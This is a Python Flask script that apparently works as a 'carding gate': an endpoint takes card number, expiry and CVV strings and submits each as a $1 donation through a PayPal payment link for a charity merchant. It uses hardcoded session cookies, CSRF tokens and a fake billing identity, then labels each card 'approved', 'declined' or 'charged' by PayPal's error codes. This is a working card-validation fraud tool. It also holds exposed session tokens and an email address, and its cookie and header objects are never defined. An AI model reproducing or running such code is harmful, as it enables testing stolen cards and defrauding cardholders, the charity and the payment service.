import requests
import json
import logging
from flask import Flask, jsonify

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Flask App
app = Flask(__name__)

# --- Status Mapping Rules ---
# Define the sets of codes for each status
APPROVED_CODES = {"INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED"}
DECLINED_CODES = {
    "CARD_GENERIC_ERROR",
    "COUNTRY_NOT_SUPPORTED",
    "EXPIRED_CARD",
    "VALIDATION_ERROR",
    "LOGIN_ERROR",
    "RISK_DISALLOWED"
}

def process_paypal_payment(card_details_string):
    """
    Processes the PayPal payment using the provided card details string.
    The string should be in the format: 'card_number|mm|yy|cvv'
    Returns a dictionary with 'code' and 'message' from the PayPal response.
    """
    try:
        # --- 1. Parse and Validate Card Details ---
        parts = card_details_string.split('|')
        if len(parts) != 4:
            return {
                'code': 'VALIDATION_ERROR',
                'message': 'Invalid input format. Expected: card_number|mm|yy|cvv'
            }

        card_number, month, year, cvv = [p.strip() for p in parts]

        # Validate month
        if not month.isdigit() or len(month) != 2 or not (1 <= int(month) <= 12):
            return {
                'code': 'INVALID_MONTH',
                'message': 'Invalid expiration month provided.'
            }

        # Validate and format year (handle yy or yyyy)
        if not year.isdigit():
            return {
                'code': 'VALIDATION_ERROR',
                'message': 'Invalid expiration year format.'
            }
        if len(year) == 2:
            year = '20' + year
        elif len(year) != 4:
             return {
                'code': 'VALIDATION_ERROR',
                'message': 'Invalid expiration year format.'
            }
        
        # Validate CVV
        if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
            return {
                'code': 'VALIDATION_ERROR',
                'message': 'Invalid CVV format.'
            }

        # Format expiry date as MM/YYYY
        expiry_date = f"{month}/{year}"

        # Determine card type
        if card_number.startswith('4'):
            card_type = 'VISA'
        elif card_number.startswith('5'):
            card_type = 'MASTER_CARD'
        elif card_number.startswith('3'):
            card_type = 'AMEX'
        else:
            card_type = 'UNKNOWN' # Fallback

        card_details = {
            'cardNumber': card_number,
            'type': card_type,
            'expirationDate': expiry_date,
            'securityCode': cvv,
            'postalCode': '10010'
        }

        # Request 2: PayPal Payment Page
        cookies.update({
            'cookie_check': 'yes', 'd_id': '12922161e46740a7acc87901fe7324831759913487189',
            'TLTDID': '80877570812458672724967916669905', 'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'H7TsI84-o0Zr9N4kGUDJtKazmaL7rM8R6DzyURNG1knPzAJaJ_pnZ7NRuAGFBktf3LcAIPy8Y_E7NtK0',
            'sc_f': '9H4wGeIJdGerRjM3qB0tbYn--97zvTburDnoV5z2DL5pvS-vqTG_td9_qT7KOZ3hC3L8biDI-YjjF7koRzbKhTfUIW6b7Hdw0BjD7W', 'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
            'ui_experience': 'did_set%3Dtrue', 'enforce_policy': 'gdpr_v2.1',
            'cf_clearance': 'DZpsMmtsNWdBjkt8Q016qfJ6V27sWXLV5nR7.Ytu3sk-1762971274-1.2.1.1-DL_yGY14LI0ZVaQp0dfLoZRI5nROygMXs2BpslSfiq5iiyqRJ3gyWai5aXegckhcauoH0N0T7Cg1.pPaeAMcBH0LMf95tfzws2cd_ub6BoZKoKoIhXD_YZzbGoTwdahPY9kcfmrZNxtFZYbVbWmUGCwlh11P00xCeG1rPrvUYZK08N7WlEi0ObutDXVRTg_gT4MqRwYkUejAjSr4hs16v3XnYioNIZFiAx9wOz6mY.Q',
            'LANG': 'en_US%3BUS', 'x-csrf-jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjdhRzMxZHhWMFhZM3dHQTZhSDI1N213allabzFFZkxZZDNVc2tKcGN2bmdXR1BFcjFVNkZiaTNCSDAtRHcwRHBWMWt3cW9DQ2oyTDI4SWJmQlhKTWFaYVUtT1NVdmhKU0w3U2ZSYzZFZ2hzU2Z6RG1zbkh4QUJPc05oQXhJOXZhRW1VNjhVVm1uR25UYzgyMUFZQk9GMEU3TVdMWlJGeEhhRFNDQ3JYQmh6bFhXd0dmVE1QdzdKVXJUbmkiLCJpYXQiOjE3NjMwMTcxMTAsImV4cCI6MTc2MzAyMDcxMH0.9sr06U4sy5w6mVM1UI67r06B0Mw532EtVct59lq2Wt8',
            'l7_az': 'dcg15.slc', 'ts_c': 'vr%3Db9d519811990accc283435ebff39312f%26vt%3D7c0232fc19a0aa38e4bfc5d6fdd038fb',
            'SEGM': 'bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ', 'TLTSID': '54911878827573588059226292747112',
            'rssk': 'd%7DC9%40%3C656%3C2%406%3F%3E%3C%3Exqx%3Ej8~%3Bw%7Cv%7D%3F14', 'ddi': 'nSZqQVx5uYRUvw6NPWwfj_V5eoJkuhauZ3QgS1Nw9mY8GSvW5QtliIsVhvXH8fT8TJIpZWcG0RvbOk4sllwxa4p2xqDYbvOI2ZOA4n1FVyxkseCZ',
            '_iidt': 'Ee+0AuoyDP98sD+7esqH/QouklwDHrZESG75LFPKmPTjXJHtiwhdrPUgU+tEAz3of/XDdACMLrOCC4bbkdo7YQDBu+wC0JVP0aqx0Jo=', 'login_email': 'fddfdrocky%40gmail.com',
            'AV894Kt2TSumQQrJwe-8mzmyREO': 'S23AAPAszO5p8Qo7d3ZRe8ID4cKE2Ap1HOPBnp1Fe9S3jRMzMrcKKVJQBUoljn3V4yrF39FZ1X7mLplacHJkj-pfByv_7tL3w', 'rmuc': 'Ib4jqFYhYkRkf0-n7C79_yKDrW5jDZxik4bbfxJ8sE7XaHqV9od4Cy-6bZw1jvtJeDtsf6jvstYxXldxl31j6x7H9j0PV2zY77tJK0XVcp0aCsSF4yHvmTL4V47mpMpXgBfMrHlvWNDxV4wWWycNxPFU9OhaSNSTLf5L6m',
            'HaC80bwXscjqZ7KM6VOxULOB534': '2aKrTRJkH7JeF2ibSIn3RzPh7TS_vnvV9p43MG7ee_lzkwvYVBEjDHCHKT0V89oGesEFe84_Zr25DtMUahHYFcrJ7Ng4ZDK317uJpZRHg8hAaLCZY0qE13gPAWGbeLljCv8ew0', 'datadome': 'XF9awpB6vz54hlQ~6CcIixFagsfNWYEnCoXEEztcLMyD4g3i43NgwmCY76PRGhkIfW3TQHcnC_hU~rwmFU3nHxAzjpSY9qR4KG6YqMEGEq3m8HpEBPyfwpB1d7Y4YCwP',
            'nsid': 's%3AXUaNH8PnV6nS2WoMzFnhCnviw29kGtZJ.8h1zeZNdVWRDH48WIrfdBy0Vve4L9nfC1jjNvfShL%2Bw', 'tsrce': 'cspreportnodeweb',
            'x-pp-s': 'eyJ0IjoiMTc2MzAxODY3Njk3NCIsImwiOiIwIiwibSI6IjAifQ', 'ts': 'vreXpYrS%3D1794554677%26vteXpYrS%3D1763020477%26vr%3Db9d519811990accc283435ebff39312f%26vt%3D7c0232fc19a0aa38e4bfc5d6fdd038fb%26vtyp%3Dreturn', '_dd_s': 'aid=024oe6ffz1&rum=2&id=12bcd115-cdb0-496b-8c70-710d1d6c4ed0&created=1763017212336&expire=1763019575864',
        })
        headers.update({'referer': 'https://dogstrustusa.org/'})
        requests.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', cookies=cookies, headers=headers, timeout=10)

        # Request 3: Create Order
        headers.update({
            'content-type': 'application/json', 'origin': 'https://www.paypal.com',
            'x-csrf-token': 'v5ArOERBgP2jPK0jWmvbtSGBln33/23T7B8OI=', 'traceparent': '00-000000000000000035c33ef71b24de23-1ac6b914c8dc9420-01'
        })
        json_data = {
            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1',
            'amount': '1', 'currency': 'USD', 'funding_source': 'CARD', 'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
        }
        requests.post('https://www.paypal.com/ncp/api/create-order', cookies=cookies, headers=headers, json=json_data, timeout=10)

        # Request 4: Submit Card Details
        headers.update({
            'paypal-client-context': '0J285934SF9809316', 'paypal-client-metadata-id': '0J285934SF9809316',
            'referer': 'https://www.paypal.com/smart/card-fields?token=7BH45372E7327524M&sessionID=uid_4e175b5f2e_mdc6mje6mdm&buttonSessionID=uid_066c21951b_mdc6mju6mja&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhJOXVmRTBTMmNiRlhFaTcxa0hSdTlNYVFiTjAxVVlQdVFpZEp4akVfdDAwWWs2TmRTcjBqb1hodDRaM05Odnc2cGpaU0NxRy1wOTlGWlMmbWVyY2hhbnQtaWQ9MzJCQUNYNlg3UFlNRyZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZjdXJyZW5jeT1VU0QmbG9jYWxlPWVuX1VTJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1jc3Atbm9uY2UiOiJEMVhrS2kzOGZvK2tURkNOdWR6OElvYlhWZ3RLOElkVjZablVZVGtnWGdCYkVvT3IiLCJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9nbXVkdHBsc2dtb2JycHp4YmNrcWlsdnZmYm50amsifX0&disable-card=',
            'x-app-name': 'standardcardfields', 'x-country': 'US'
        })
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': '7BH45372E7327524M', 'card': card_details, 'phoneNumber': '2399925589',
                'firstName': 'Rocky', 'lastName': 'og',
                'billingAddress': {'givenName': 'Rocky', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'NY', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
                'shippingAddress': {'givenName': 'Rocky', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'NY', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
                'email': 'rockyog@gmail.com', 'currencyConversionType': 'VENDOR',
            }, 'operationName': None,
        }
        response = requests.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=cookies, headers=headers, json=json_data, timeout=20)
        response_data = response.json()

        # --- 3. Parse PayPal Response ---
        # Default to success if no errors are present
        result = {'code': 'TRANSACTION_SUCCESSFUL', 'message': 'Payment processed successfully.'}

        if 'errors' in response_data and response_data['errors']:
            # Extract the first error code and message
            error_data = response_data['errors'][0]
            result['code'] = error_data.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR')
            result['message'] = error_data.get('message', 'An unknown error occurred.')
        
        return result

    except requests.exceptions.RequestException as e:
        logging.error(f"Network error during PayPal processing: {e}")
        return {'code': 'NETWORK_ERROR', 'message': 'Could not connect to payment gateway.'}
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        return {'code': 'INTERNAL_ERROR', 'message': 'An internal server error occurred.'}


@app.route('/gate=pp1/cc=<card_details>')
def payment_gateway(card_details):
    """
    Main endpoint to process a payment.
    URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}
    """
    logging.info(f"Received payment request for card ending in {card_details[-4:]}")
    
    # Step 1: Process the payment and get the raw result
    result = process_paypal_payment(card_details)
    
    # Step 2: Determine the final status based on the result's code
    code = result.get('code')
    
    # The INVALID_MONTH case is already handled by the processing function
    if code in APPROVED_CODES:
        status = 'approved'
    elif code in DECLINED_CODES or code == 'INVALID_MONTH':
        status = 'declined'
    else:
        # Any other code, including success codes, results in 'charged'
        status = 'charged'

    # Step 3: Construct and return the final JSON response
    final_response = {
        "status": status,
        "code": code,
        "message": result.get('message')
    }
    
    logging.info(f"Transaction result: {final_response}")
    return jsonify(final_response)


if __name__ == '__main__':
    # Running the app on 0.0.0.0 makes it accessible from other devices on the same network
    app.run(host='0.0.0.0', port=5000, debug=True)
